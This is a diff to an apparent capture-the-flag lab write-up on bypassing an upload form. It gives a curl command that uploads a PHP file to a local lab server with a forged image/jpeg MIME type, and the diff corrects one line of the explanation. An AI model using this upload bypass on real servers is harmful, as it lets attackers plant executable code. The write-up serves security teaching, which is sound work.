@@ -25,7 +25,7 @@ Second method :
 Now that we know that we just have to change the content type of the file to bypass the form security, we'll try a more scalable method using the terminal and Curl. Create a coucou.php file then enter this command in your terminal: `curl 'http://192.168.56.101/index.php?page=upload#' -X POST -F "uploaded=@./coucou.php;type=image/jpeg" "Upload=Upload" | grep flag`
 
 * `curl 'http://192.168.56.101/index.php?page=upload#'` -> This initiates a cURL command to send an HTTP POST request to the specified URL.
-* `-F "uploaded=@./coucou.php;type=image/jpeg"` This specifies the file to be uploaded and falsely sets its MIME type to `image/jpeg`, indicating it is a PHP script.
+* `-F "uploaded=@./coucou.php;type=image/jpeg"` This specifies the file to be uploaded and falsely sets its MIME type to `image/jpeg`, indicating it is an image.
 * `-F "Upload=Upload" | grep flag` This adds a form field named Upload with a value of Upload accordingly to the form present on the website to trigger the upload action and grep the flag in the http response
 
 ## Risks:
